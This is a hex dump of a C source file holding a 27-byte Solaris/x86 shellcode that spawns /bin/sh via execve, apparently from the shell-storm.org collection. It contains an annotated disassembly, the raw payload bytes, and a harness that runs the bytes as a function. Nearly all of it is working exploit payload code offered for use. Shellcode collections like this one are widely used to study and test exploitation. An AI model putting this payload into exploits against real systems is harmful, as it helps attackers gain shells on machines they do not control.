00000000  2f 2a 0a 54 69 74 6c 65  3a 20 09 20 53 6f 6c 61  |/*.Title: . Sola|
00000010  72 69 73 2f 78 38 36 20  2d 20 65 78 65 63 76 65  |ris/x86 - execve|
00000020  28 22 2f 62 69 6e 2f 73  68 22 2c 22 2f 62 69 6e  |("/bin/sh","/bin|
00000030  2f 73 68 22 2c 4e 55 4c  4c 29 20 2d 20 32 37 20  |/sh",NULL) - 27 |
00000040  62 79 74 65 73 0a 41 75  74 68 6f 72 3a 20 20 4a  |bytes.Author:  J|
00000050  6f 6e 61 74 68 61 6e 20  53 61 6c 77 61 6e 20 3c  |onathan Salwan <|
00000060  73 75 62 6d 69 74 20 41  54 20 73 68 65 6c 6c 2d  |submit AT shell-|
00000070  73 74 6f 72 6d 2e 6f 72  67 3e 0a 57 65 62 3a 09  |storm.org>.Web:.|
00000080  20 68 74 74 70 3a 2f 2f  77 77 77 2e 73 68 65 6c  | http://www.shel|
00000090  6c 2d 73 74 6f 72 6d 2e  6f 72 67 0a 54 77 69 74  |l-storm.org.Twit|
000000a0  74 65 72 3a 20 68 74 74  70 3a 2f 2f 74 77 69 74  |ter: http://twit|
000000b0  74 65 72 2e 63 6f 6d 2f  6a 6f 6e 61 74 68 61 6e  |ter.com/jonathan|
000000c0  73 61 6c 77 61 6e 0a 0a  44 61 74 65 3a 09 20 32  |salwan..Date:. 2|
000000d0  30 31 30 2d 30 35 2d 31  39 0a 54 65 73 74 65 64  |010-05-19.Tested|
000000e0  3a 20 20 53 75 6e 4f 53  20 6f 70 65 6e 73 6f 6c  |:  SunOS opensol|
000000f0  61 72 69 73 20 35 2e 31  31 20 73 6e 76 5f 31 31  |aris 5.11 snv_11|
00000100  31 62 20 69 38 36 70 63  20 69 33 38 36 20 69 38  |1b i86pc i386 i8|
00000110  36 70 63 20 53 6f 6c 61  72 69 73 0a 0a 73 65 63  |6pc Solaris..sec|
00000120  74 69 6f 6e 20 2e 74 65  78 74 0a 20 20 20 20 30  |tion .text.    0|
00000130  78 38 30 34 38 30 37 34  3a 20 20 20 20 20 20 20  |x8048074:       |
00000140  20 20 20 20 20 20 20 33  31 20 63 30 20 20 20 20  |       31 c0    |
00000150  20 20 20 20 20 20 20 20  20 20 78 6f 72 6c 20 20  |          xorl  |
00000160  20 25 65 61 78 2c 25 65  61 78 0a 20 20 20 20 30  | %eax,%eax.    0|
00000170  78 38 30 34 38 30 37 36  3a 20 20 20 20 20 20 20  |x8048076:       |
00000180  20 20 20 20 20 20 20 35  30 20 20 20 20 20 20 20  |       50       |
00000190  20 20 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |          pushl |
000001a0  20 25 65 61 78 0a 20 20  20 20 30 78 38 30 34 38  | %eax.    0x8048|
000001b0  30 37 37 3a 20 20 20 20  20 20 20 20 20 20 20 20  |077:            |
000001c0  20 20 36 38 20 36 65 20  32 66 20 37 33 20 36 38  |  68 6e 2f 73 68|
000001d0  20 20 20 20 20 70 75 73  68 6c 20 20 24 30 78 36  |     pushl  $0x6|
000001e0  38 37 33 32 66 36 65 0a  20 20 20 20 30 78 38 30  |8732f6e.    0x80|
000001f0  34 38 30 37 63 3a 20 20  20 20 20 20 20 20 20 20  |4807c:          |
00000200  20 20 20 20 36 38 20 32  66 20 32 66 20 36 32 20  |    68 2f 2f 62 |
00000210  36 39 20 20 20 20 20 70  75 73 68 6c 20 20 24 30  |69     pushl  $0|
00000220  78 36 39 36 32 32 66 32  66 0a 20 20 20 20 30 78  |x69622f2f.    0x|
00000230  38 30 34 38 30 38 31 3a  20 20 20 20 20 20 20 20  |8048081:        |
00000240  20 20 20 20 20 20 38 39  20 65 33 20 20 20 20 20  |      89 e3     |
00000250  20 20 20 20 20 20 20 20  20 6d 6f 76 6c 20 20 20  |         movl   |
00000260  25 65 73 70 2c 25 65 62  78 0a 20 20 20 20 30 78  |%esp,%ebx.    0x|
00000270  38 30 34 38 30 38 33 3a  20 20 20 20 20 20 20 20  |8048083:        |
00000280  20 20 20 20 20 20 35 30  20 20 20 20 20 20 20 20  |      50        |
00000290  20 20 20 20 20 20 20 20  20 70 75 73 68 6c 20 20  |         pushl  |
000002a0  25 65 61 78 0a 20 20 20  20 30 78 38 30 34 38 30  |%eax.    0x80480|
000002b0  38 34 3a 20 20 20 20 20  20 20 20 20 20 20 20 20  |84:             |
000002c0  20 35 33 20 20 20 20 20  20 20 20 20 20 20 20 20  | 53             |
000002d0  20 20 20 20 70 75 73 68  6c 20 20 25 65 62 78 0a  |    pushl  %ebx.|
000002e0  20 20 20 20 30 78 38 30  34 38 30 38 35 3a 20 20  |    0x8048085:  |
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 38 39 20 65  |            89 e|
00000300  32 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |2              m|
00000310  6f 76 6c 20 20 20 25 65  73 70 2c 25 65 64 78 0a  |ovl   %esp,%edx.|
00000320  20 20 20 20 30 78 38 30  34 38 30 38 37 3a 20 20  |    0x8048087:  |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 35 30 20 20  |            50  |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 70  |               p|
00000350  75 73 68 6c 20 20 25 65  61 78 0a 20 20 20 20 30  |ushl  %eax.    0|
00000360  78 38 30 34 38 30 38 38  3a 20 20 20 20 20 20 20  |x8048088:       |
00000370  20 20 20 20 20 20 20 35  32 20 20 20 20 20 20 20  |       52       |
00000380  20 20 20 20 20 20 20 20  20 20 70 75 73 68 6c 20  |          pushl |
00000390  20 25 65 64 78 0a 20 20  20 20 30 78 38 30 34 38  | %edx.    0x8048|
000003a0  30 38 39 3a 20 20 20 20  20 20 20 20 20 20 20 20  |089:            |
000003b0  20 20 35 33 20 20 20 20  20 20 20 20 20 20 20 20  |  53            |
000003c0  20 20 20 20 20 70 75 73  68 6c 20 20 25 65 62 78  |     pushl  %ebx|
000003d0  0a 20 20 20 20 30 78 38  30 34 38 30 38 61 3a 20  |.    0x804808a: |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 20 62 30 20  |             b0 |
000003f0  33 62 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3b              |
00000400  6d 6f 76 62 20 20 20 24  30 78 33 62 2c 25 61 6c  |movb   $0x3b,%al|
00000410  0a 20 20 20 20 30 78 38  30 34 38 30 38 63 3a 20  |.    0x804808c: |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 20 35 30 20  |             50 |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000440  70 75 73 68 6c 20 20 25  65 61 78 0a 20 20 20 20  |pushl  %eax.    |
00000450  30 78 38 30 34 38 30 38  64 3a 20 20 20 20 20 20  |0x804808d:      |
00000460  20 20 20 20 20 20 20 20  63 64 20 39 31 20 20 20  |        cd 91   |
00000470  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 20  |           int  |
00000480  20 20 24 30 78 39 31 0a  0a 2a 2f 0a 0a 0a 23 69  |  $0x91..*/...#i|
00000490  6e 63 6c 75 64 65 20 3c  73 74 64 69 6f 2e 68 3e  |nclude <stdio.h>|
000004a0  0a 0a 63 68 61 72 20 73  63 5b 5d 20 3d 20 22 5c  |..char sc[] = "\|
000004b0  78 33 31 5c 78 63 30 5c  78 35 30 5c 78 36 38 5c  |x31\xc0\x50\x68\|
000004c0  78 36 65 5c 78 32 66 22  0a 09 20 20 20 20 22 5c  |x6e\x2f"..    "\|
000004d0  78 37 33 5c 78 36 38 5c  78 36 38 5c 78 32 66 5c  |x73\x68\x68\x2f\|
000004e0  78 32 66 5c 78 36 32 22  0a 09 20 20 20 20 22 5c  |x2f\x62"..    "\|
000004f0  78 36 39 5c 78 38 39 5c  78 65 33 5c 78 35 30 5c  |x69\x89\xe3\x50\|
00000500  78 35 33 5c 78 38 39 22  0a 09 20 20 20 20 22 5c  |x53\x89"..    "\|
00000510  78 65 32 5c 78 35 30 5c  78 35 32 5c 78 35 33 5c  |xe2\x50\x52\x53\|
00000520  78 62 30 5c 78 33 62 22  0a 09 20 20 20 20 22 5c  |xb0\x3b"..    "\|
00000530  78 35 30 5c 78 63 64 5c  78 39 31 22 3b 0a 0a 69  |x50\xcd\x91";..i|
00000540  6e 74 20 6d 61 69 6e 28  76 6f 69 64 29 0a 7b 0a  |nt main(void).{.|
00000550  20 20 20 20 20 20 20 09  66 70 72 69 6e 74 66 28  |       .fprintf(|
00000560  73 74 64 6f 75 74 2c 22  4c 65 6e 67 74 68 3a 20  |stdout,"Length: |
00000570  25 64 5c 6e 22 2c 73 74  72 6c 65 6e 28 73 63 29  |%d\n",strlen(sc)|
00000580  29 3b 0a 09 28 2a 28 76  6f 69 64 28 2a 29 28 29  |);..(*(void(*)()|
00000590  29 20 73 63 29 28 29 3b  0a 0a 72 65 74 75 72 6e  |) sc)();..return|
000005a0  20 30 3b 0a 7d                                    | 0;.}|
000005a5
